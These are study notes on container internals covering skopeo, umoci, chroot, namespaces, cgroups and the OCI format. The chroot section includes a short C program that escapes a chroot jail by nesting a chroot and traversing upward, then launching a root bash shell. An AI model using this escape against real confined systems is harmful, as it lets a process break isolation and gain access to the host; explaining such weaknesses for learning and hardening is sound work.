## Overview
Containers are only isolated groups of processes running on a single host, which fulfill a set of “common” features. A container is built using layers, each layer represents some additional functionality. 


## Skopeo
Skopeo inspects a container image, it can perform operations which consist of:
- Copying an image from and to various storage mechanisms. For example you can copy images from one registry to another, without requiring privilege.
- Inspecting a remote image showing its properties including its layers, without requiring you to pull the image to the host.
- Deleting an image from an image repository.
- Syncing an external image repository to an internal registry for air-gapped deployments.
- When required by the repository, skopeo can pass the appropriate credentials and certificates for authentication.

## Umoci
umoci modifies Open Container images

## Chroot
Lets you change the root to a new root, however you can pop out of the environment with a process running as the root user since you can create a new chroot and traverse relatively out of it 
```
#include <sys/stat.h>
#include <unistd.h>

int main(void)
{
    mkdir(".out", 0755);
    chroot(".out");
    chdir("../../../../../");
    chroot(".");
    return execl("/bin/bash", "-i", NULL);
}
```

## Linux namespaces
wrap certain global system resources in an abstraction layer. This makes it appear like the processes within a namespace have their own isolated instance of the resource

seven distinct namespaces implemented: 
- mnt
- pid
- net
- ipc
- uts
- user
- cgroup




## Cgroups 
short for "control group," is a Linux kernel feature that allows the management of system resources and sets limits for groups of processes. It provides a way to group processes and manage their resource usage, such as CPU, memory, and I/O bandwidth, among others.

## Open Container Initiative 
An open format for containers and an alternative to Docker. You can read more about the format [here](https://ravichaganti.com/blog/2022-10-28-understanding-container-images-oci-image-specification/}
